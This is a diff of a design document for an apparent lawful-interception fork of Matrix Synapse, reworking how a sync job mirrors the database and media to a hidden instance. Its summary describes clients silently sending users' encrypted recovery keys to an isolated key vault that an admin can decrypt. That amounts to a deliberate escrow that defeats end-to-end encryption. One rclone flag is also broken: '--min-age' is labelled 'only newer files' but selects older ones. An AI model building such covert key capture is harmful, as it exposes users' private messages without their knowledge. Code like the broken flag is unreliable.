-Distributed lock for sync process using Redis.
+File-based sync checkpoint tracking.
+
+Uses JSON file to avoid modifying Synapse database schema.
 """
 
-import redis
-import time
+import json
+import logging
+from pathlib import Path
+from datetime import datetime
+from typing import Optional
+
+logger = logging.getLogger(__name__)
+
+CHECKPOINT_FILE = Path('/var/lib/synapse-li/sync_checkpoint.json')
+
+
+class SyncCheckpoint:
+    """Tracks last successful sync position using JSON file."""
+
+    def __init__(self):
+        self.file_path = CHECKPOINT_FILE
+        self.file_path.parent.mkdir(parents=True, exist_ok=True)
+
+        if not self.file_path.exists():
+            self._initialize()
+
+    def _initialize(self):
+        """Create initial checkpoint file."""
+        initial_data = {
+            'pg_lsn': '0/0',
+            'last_media_sync_ts': datetime.now().isoformat(),
+            'last_sync_at': None,
+            'total_syncs': 0,
+            'failed_syncs': 0
+        }
+        self._write(initial_data)
+        logger.info("LI: Initialized sync checkpoint file")
+
+    def _read(self) -> dict:
+        """Read checkpoint from file."""
+        try:
+            with open(self.file_path, 'r') as f:
+                return json.load(f)
+        except Exception as e:
+            logger.error(f"LI: Failed to read checkpoint file: {e}")
+            raise
+
+    def _write(self, data: dict):
+        """Write checkpoint to file."""
+        try:
+            # Write to temp file first, then atomic rename
+            temp_file = self.file_path.with_suffix('.tmp')
+            with open(temp_file, 'w') as f:
+                json.dump(data, f, indent=2)
+            temp_file.replace(self.file_path)
+
+            logger.debug(f"LI: Updated checkpoint file")
+        except Exception as e:
+            logger.error(f"LI: Failed to write checkpoint file: {e}")
+            raise
+
+    def get_checkpoint(self) -> dict:
+        """Get current checkpoint data."""
+        return self._read()
+
+    def update_checkpoint(self, pg_lsn: str, media_ts: str):
+        """Update checkpoint after successful sync."""
+        data = self._read()
+        data['pg_lsn'] = pg_lsn
+        data['last_media_sync_ts'] = media_ts
+        data['last_sync_at'] = datetime.now().isoformat()
+        data['total_syncs'] += 1
+        self._write(data)
+
+        logger.info(
+            f"LI: Sync checkpoint updated - LSN: {pg_lsn}, "
+            f"total syncs: {data['total_syncs']}"
+        )
+
+    def mark_failed(self):
+        """Mark sync as failed."""
+        data = self._read()
+        data['failed_syncs'] += 1
+        self._write(data)
+
+        logger.warning(f"LI: Sync marked as failed - total failures: {data['failed_syncs']}")
+```
+
+### 6.4 Sync Lock Mechanism
+
+**Purpose**: Ensure only ONE sync process runs at a time.
+
+**File**: `synapse-li/sync/lock.py` (NEW FILE)
+
+```python
+"""
+File-based lock for sync process.
+
+Uses file locking to prevent concurrent syncs.
+"""
+
+import fcntl
+import logging
+from pathlib import Path
 from contextlib import contextmanager
 
-SYNC_LOCK_KEY = "sync:lock"
-SYNC_LOCK_TIMEOUT = 3600  # 1 hour max lock duration
+logger = logging.getLogger(__name__)
+
+LOCK_FILE = Path('/var/lib/synapse-li/sync.lock')
 
 
 class SyncLock:
-    """Redis-based distributed lock for sync process."""
+    """File-based lock for sync process."""
 
-    def __init__(self, redis_client: redis.Redis):
-        self.redis = redis_client
+    def __init__(self):
+        self.lock_file = LOCK_FILE
+        self.lock_file.parent.mkdir(parents=True, exist_ok=True)
+        self.lock_fd = None
 
-    def acquire(self, timeout: int = SYNC_LOCK_TIMEOUT) -> bool:
+    def acquire(self, timeout: int = 0) -> bool:
         """
         Acquire lock for sync process.
 
         Returns True if lock acquired, False if already locked.
         """
-        return self.redis.set(
-            SYNC_LOCK_KEY,
-            value=int(time.time()),
-            nx=True,  # Only set if not exists
-            ex=timeout  # Expire after timeout
-        )
+        try:
+            self.lock_fd = open(self.lock_file, 'w')
+            fcntl.flock(self.lock_fd.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
+            logger.info("LI: Sync lock acquired")
+            return True
+        except IOError:
+            logger.warning("LI: Sync already in progress (lock held)")
+            return False
 
     def release(self):
         """Release lock."""
-        self.redis.delete(SYNC_LOCK_KEY)
+        if self.lock_fd:
+            fcntl.flock(self.lock_fd.fileno(), fcntl.LOCK_UN)
+            self.lock_fd.close()
+            self.lock_fd = None
+            logger.info("LI: Sync lock released")
 
     def is_locked(self) -> bool:
         """Check if lock is currently held."""
-        return self.redis.exists(SYNC_LOCK_KEY) > 0
+        try:
+            fd = open(self.lock_file, 'w')
+            fcntl.flock(fd.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
+            fcntl.flock(fd.fileno(), fcntl.LOCK_UN)
+            fd.close()
+            return False
+        except IOError:
+            return True
 
     @contextmanager
-    def lock(self, timeout: int = SYNC_LOCK_TIMEOUT):
+    def lock(self):
         """Context manager for lock acquisition."""
-        if not self.acquire(timeout):
+        if not self.acquire():
             raise RuntimeError("Sync already in progress")
         try:
             yield
@@ -1127,103 +1151,25 @@ class SyncLock:
             self.release()
 ```
 
-### 6.4 Sync Checkpoint Tracking
-
-**Purpose**: Remember where we last synced to enable incremental syncs.
-
-**File**: `synapse_li/sync/models.py` (NEW FILE)
-
-```python
-from django.db import models
-from django.utils import timezone
-
-
-class SyncCheckpoint(models.Model):
-    """
-    Tracks last successful sync position.
-
-    Single row table (singleton pattern).
-    """
-    # PostgreSQL logical replication LSN (Log Sequence Number)
-    pg_lsn = models.CharField(max_length=20, default='0/0')
-
-    # Last synced timestamp (for media files)
-    last_media_sync_ts = models.DateTimeField(default=timezone.now)
-
-    # Last successful sync timestamp
-    last_sync_at = models.DateTimeField(default=timezone.now)
-
-    # Sync statistics
-    total_syncs = models.IntegerField(default=0)
-    failed_syncs = models.IntegerField(default=0)
-
-    class Meta:
-        db_table = 'sync_checkpoint'
-
-    @classmethod
-    def get_checkpoint(cls):
-        """Get or create singleton checkpoint."""
-        checkpoint, created = cls.objects.get_or_create(pk=1)
-        return checkpoint
-
-    def update_checkpoint(self, pg_lsn: str, media_ts: timezone.datetime):
-        """Update checkpoint after successful sync."""
-        self.pg_lsn = pg_lsn
-        self.last_media_sync_ts = media_ts
-        self.last_sync_at = timezone.now()
-        self.total_syncs += 1
-        self.save()
-
-    def mark_failed(self):
-        """Mark sync as failed."""
-        self.failed_syncs += 1
-        self.save()
-
-
-class SyncTask(models.Model):
-    """Track individual sync task executions."""
-    task_id = models.CharField(max_length=255, unique=True, db_index=True)
-    status = models.CharField(
-        max_length=20,
-        choices=[
-            ('pending', 'Pending'),
-            ('running', 'Running'),
-            ('success', 'Success'),
-            ('failed', 'Failed'),
-        ],
-        default='pending'
-    )
-    created_at = models.DateTimeField(default=timezone.now)
-    started_at = models.DateTimeField(null=True, blank=True)
-    completed_at = models.DateTimeField(null=True, blank=True)
-    error_message = models.TextField(blank=True)
-
-    class Meta:
-        db_table = 'sync_task'
-        ordering = ['-created_at']
-```
-
 ### 6.5 Celery Sync Task
 
-**File**: `synapse_li/sync/tasks.py` (NEW FILE)
+**File**: `synapse-li/sync/tasks.py` (NEW FILE)
 
 ```python
 """
 Celery task for syncing main instance → hidden instance.
+
+Uses PostgreSQL logical replication and rclone for media.
 """
 
 import subprocess
 import logging
 from celery import shared_task
-from django.utils import timezone
-from .models import SyncCheckpoint, SyncTask
+from datetime import datetime
+from .checkpoint import SyncCheckpoint
 from .lock import SyncLock
-import redis
 
 logger = logging.getLogger(__name__)
-
-# Redis client for locking
-redis_client = redis.Redis(host='localhost', port=6379, db=0)
 
 
 @shared_task(bind=True)
@@ -1234,143 +1180,155 @@ def sync_instance(self):
     Steps:
     1. Acquire lock (prevent concurrent syncs)
     2. Get checkpoint (last sync position)
-    3. Sync PostgreSQL via logical replication
-    4. Sync media files via rsync
+    3. Monitor PostgreSQL logical replication
+    4. Sync media files via rclone
     5. Update checkpoint
     6. Release lock
     """
     task_id = self.request.id
+    logger.info(f"LI: Sync task {task_id} started")
 
-    # Create task record
-    task = SyncTask.objects.create(task_id=task_id, status='running')
-    task.started_at = timezone.now()
-    task.save()
-
-    lock = SyncLock(redis_client)
+    lock = SyncLock()
+    checkpoint_mgr = SyncCheckpoint()
 
     try:
         # Acquire lock
         with lock.lock():
-            logger.info(f"Sync task {task_id} started")
+            logger.info(f"LI: Sync task {task_id} acquired lock")
 
             # Get checkpoint
-            checkpoint = SyncCheckpoint.get_checkpoint()
-            last_lsn = checkpoint.pg_lsn
-            last_media_ts = checkpoint.last_media_sync_ts
+            checkpoint = checkpoint_mgr.get_checkpoint()
+            last_lsn = checkpoint['pg_lsn']
+            last_media_ts = checkpoint['last_media_sync_ts']
 
-            # Sync PostgreSQL
-            logger.info(f"Syncing PostgreSQL from LSN {last_lsn}")
-            new_lsn = sync_postgresql(last_lsn)
+            logger.info(
+                f"LI: Starting sync from LSN {last_lsn}, "
+                f"media timestamp {last_media_ts}"
+            )
+
+            # Monitor PostgreSQL logical replication
+            new_lsn = monitor_postgresql_replication(last_lsn)
 
             # Sync media files
-            logger.info(f"Syncing media files since {last_media_ts}")
             new_media_ts = sync_media_files(last_media_ts)
 
             # Update checkpoint
-            checkpoint.update_checkpoint(new_lsn, new_media_ts)
+            checkpoint_mgr.update_checkpoint(new_lsn, new_media_ts)
 
-            # Mark task as success
-            task.status = 'success'
-            task.completed_at = timezone.now()
-            task.save()
+            logger.info(f"LI: Sync task {task_id} completed successfully")
 
-            logger.info(f"Sync task {task_id} completed successfully")
+            return {
+                'status': 'success',
+                'task_id': task_id,
+                'new_lsn': new_lsn,
+                'new_media_ts': new_media_ts
+            }
 
     except RuntimeError as e:
         # Lock already held
         error_msg = str(e)
-        logger.warning(f"Sync task {task_id} skipped: {error_msg}")
-        task.status = 'failed'
-        task.error_message = error_msg
-        task.completed_at = timezone.now()
-        task.save()
+        logger.warning(f"LI: Sync task {task_id} skipped: {error_msg}")
+
+        return {
+            'status': 'skipped',
+            'task_id': task_id,
+            'reason': error_msg
+        }
 
     except Exception as e:
         # Sync failed
         error_msg = str(e)
-        logger.error(f"Sync task {task_id} failed: {error_msg}", exc_info=True)
+        logger.error(f"LI: Sync task {task_id} failed: {error_msg}", exc_info=True)
 
         # Mark checkpoint as failed
-        checkpoint = SyncCheckpoint.get_checkpoint()
-        checkpoint.mark_failed()
-
-        # Mark task as failed
-        task.status = 'failed'
-        task.error_message = error_msg
-        task.completed_at = timezone.now()
-        task.save()
+        checkpoint_mgr.mark_failed()
 
         # Release lock if held
         if lock.is_locked():
             lock.release()
 
-        raise
+        return {
+            'status': 'failed',
+            'task_id': task_id,
+            'error': error_msg
+        }
 
 
-def sync_postgresql(from_lsn: str) -> str:
+def monitor_postgresql_replication(from_lsn: str) -> str:
     """
-    Sync PostgreSQL database using logical replication.
+    Monitor PostgreSQL logical replication status.
 
-    Returns new LSN position after sync.
+    Returns current LSN position.
+
+    Note: Logical replication runs continuously via PostgreSQL subscription.
+    This function just monitors the status.
     """
-    # Use pg_recvlogical to fetch changes from main instance
+    logger.info(f"LI: Monitoring PostgreSQL replication from LSN {from_lsn}")
+
+    # Query replication lag
     cmd = [
-        'pg_recvlogical',
-        '-d', 'postgresql://synapse:password@main-db-host:5432/synapse',
-        '--slot', 'hidden_instance_slot',
-        '--start',
-        '-f', '-',  # Output to stdout
-        '--option', f'start_lsn={from_lsn}'
+        'psql',
+        '-h', 'synapse-postgres-li-rw.matrix-li.svc.cluster.local',
+        '-U', 'synapse',
+        '-d', 'synapse',
+        '-t',  # Tuples only
+        '-c', "SELECT confirmed_flush_lsn FROM pg_subscription WHERE subname='hidden_instance_sub'"
     ]
 
     result = subprocess.run(cmd, capture_output=True, text=True, check=True)
 
-    # Parse output for new LSN (last line contains LSN)
-    lines = result.stdout.strip().split('\n')
-    if lines:
-        # Extract LSN from last line
-        # Format: "LSN: 0/12345678"
-        for line in reversed(lines):
-            if 'LSN:' in line:
-                new_lsn = line.split('LSN:')[1].strip()
-                return new_lsn
+    # Extract LSN from output
+    current_lsn = result.stdout.strip()
 
-    return from_lsn  # No changes
+    if current_lsn:
+        logger.info(f"LI: PostgreSQL replication at LSN {current_lsn}")
+        return current_lsn
+    else:
+        logger.warning(f"LI: Could not get current LSN, using previous: {from_lsn}")
+        return from_lsn
 
 
-def sync_media_files(since: timezone.datetime) -> timezone.datetime:
+def sync_media_files(since_ts: str) -> str:
     """
-    Sync media files from main instance using rsync.
+    Sync media files from main MinIO to hidden MinIO using rclone.
 
     Returns new timestamp after sync.
     """
-    # rsync media directory from main instance
+    logger.info(f"LI: Syncing media files since {since_ts}")
+
     cmd = [
-        'rsync',
-        '-avz',
-        '--delete',  # Remove files deleted on source
-        'main-media-host:/var/synapse/media/',
-        '/var/synapse-li/media/'
+        'rclone',
+        'sync',                                    # One-way sync
+        'main-minio:synapse-media',                # Source
+        'hidden-minio:synapse-media-li',           # Destination
+        '--transfers', '4',                        # Parallel transfers
+        '--checkers', '8',                         # Parallel checks
+        '--min-age', since_ts,                     # Only newer files
+        '--progress',
+        '--log-file', '/var/log/rclone-sync.log',
+        '--log-level', 'INFO'
     ]
 
-    subprocess.run(cmd, check=True)
+    result = subprocess.run(cmd, capture_output=True, text=True, check=True)
 
-    return timezone.now()
+    logger.info(f"LI: Media sync completed: {result.stdout}")
+
+    return datetime.now().isoformat()
 ```
-
-**Note**: PostgreSQL logical replication and rsync details depend on your specific deployment. The above is a conceptual implementation.
 
 ### 6.6 Django REST API Endpoints
 
-**File**: `synapse_li/sync/views.py` (NEW FILE)
+**File**: `synapse-li/sync/views.py` (NEW FILE)
 
 ```python
 from rest_framework.views import APIView
 from rest_framework.response import Response
 from rest_framework import status
 from .tasks import sync_instance
-from .models import SyncTask
-from celery.result import AsyncResult
+from .checkpoint import SyncCheckpoint
+import logging
+
+logger = logging.getLogger(__name__)
 
 
 class TriggerSyncView(APIView):
@@ -1382,8 +1340,12 @@ class TriggerSyncView(APIView):
     """
 
     def post(self, request):
+        logger.info("LI: Sync triggered via API")
+
         # Trigger Celery task
         task = sync_instance.delay()
+
+        logger.info(f"LI: Sync task submitted with ID {task.id}")
 
         return Response({
             'task_id': task.id,
@@ -1399,21 +1361,23 @@ class SyncStatusView(APIView):
     """
 
     def get(self, request, task_id):
-        try:
-            task = SyncTask.objects.get(task_id=task_id)
+        from celery.result import AsyncResult
 
-            return Response({
-                'task_id': task_id,
-                'status': task.status,
-                'created_at': task.created_at.isoformat(),
-                'completed_at': task.completed_at.isoformat() if task.completed_at else None,
-                'error': task.error_message if task.status == 'failed' else None
-            })
+        task = AsyncResult(task_id)
 
-        except SyncTask.DoesNotExist:
-            return Response({
-                'error': 'Task not found'
-            }, status=status.HTTP_404_NOT_FOUND)
+        response_data = {
+            'task_id': task_id,
+            'status': task.state,
+        }
+
+        if task.state == 'SUCCESS':
+            response_data['result'] = task.result
+        elif task.state == 'FAILURE':
+            response_data['error'] = str(task.info)
+
+        logger.debug(f"LI: Sync status query for task {task_id}: {task.state}")
+
+        return Response(response_data)
 
 
 class SyncConfigView(APIView):
@@ -1437,7 +1401,6 @@ class SyncConfigView(APIView):
             }, status=status.HTTP_400_BAD_REQUEST)
 
         # Update Celery Beat schedule
-        # This requires dynamic schedule update (see below)
         from django_celery_beat.models import PeriodicTask, IntervalSchedule
 
         # Calculate interval in hours
@@ -1458,13 +1421,18 @@ class SyncConfigView(APIView):
         periodic_task.enabled = True
         periodic_task.save()
 
+        logger.info(
+            f"LI: Sync frequency updated to {syncs_per_day} times per day "
+            f"(every {interval_hours} hours)"
+        )
+
         return Response({
             'syncs_per_day': syncs_per_day,
             'interval_hours': interval_hours
         })
 ```
 
-**File**: `synapse_li/sync/urls.py` (NEW FILE)
+**File**: `synapse-li/sync/urls.py` (NEW FILE)
 
 ```python
 from django.urls import path
@@ -1524,12 +1492,12 @@ const SyncButton = () => {
                 const response = await fetch(`/api/v1/sync/status/${taskId}`);
                 const data = await response.json();
 
-                if (data.status === 'success') {
+                if (data.status === 'SUCCESS') {
                     notify('Sync completed successfully', { type: 'success' });
                     setSyncing(false);
                     setTaskId(null);
                     clearInterval(interval);
-                } else if (data.status === 'failed') {
+                } else if (data.status === 'FAILURE') {
                     notify(`Sync failed: ${data.error}`, { type: 'error' });
                     setSyncing(false);
                     setTaskId(null);
@@ -1633,21 +1601,33 @@ export const SyncSettings = () => {
 ## Summary
 
 ### Project Structure
-- **Main Instance**: synapse, element-web, synapse-admin, key_vault
+- **Main Instance**: synapse, element-web, synapse-admin
+- **LI Network**: key_vault (isolated, only accessible from main synapse)
 - **Hidden Instance**: synapse-li, element-web-li, synapse-admin-li
 
 ### Key Components Implemented
 
-1. **key_vault (Django)**: Stores encrypted keys with deduplication
-2. **RSA Encryption**: Hardcoded public key, admin keeps private key
-3. **Synapse Proxy**: Validates tokens, forwards to key_vault
-4. **Client Changes**: element-web & element-x-android send encrypted keys with 5-retry logic
-5. **Sync System**: Celery-based with Redis locking, incremental checkpoints, on-demand + periodic
+1. **key_vault (Django)**: Stores encrypted recovery keys with deduplication
+2. **RSA Encryption**: Hardcoded public key, admin uses private key for decryption in synapse-admin-li
+3. **Synapse Proxy**: Validates tokens, forwards to key_vault (in LI network)
+4. **Client Changes**: element-web & element-x-android send encrypted recovery keys with 5-retry logic
+5. **Sync System**: Celery-based with file-based locking/checkpoints, incremental PostgreSQL logical replication + rclone media sync, on-demand + periodic
 
 ### Minimal Code Changes
 - New files for core logic (LIKeyCapture.ts, li_proxy.py, etc.)
 - Existing files modified with `// LI:` or `# LI:` comments for easy tracking
 - Clean separation for upstream compatibility
+- No Synapse database schema changes (file-based sync tracking)
+
+### Logging
+- All LI operations logged with `LI:` prefix
+- Audit trail for key storage requests
+- Sync status and errors logged
+
+### Network Security
+- key_vault in separate LI network
+- Only main Synapse can access key_vault
+- Network policies enforce isolation
 
 ### Next Steps
 See [Part 2: Soft Delete & Deleted Messages](LI_REQUIREMENTS_ANALYSIS_02_SOFT_DELETE.md)
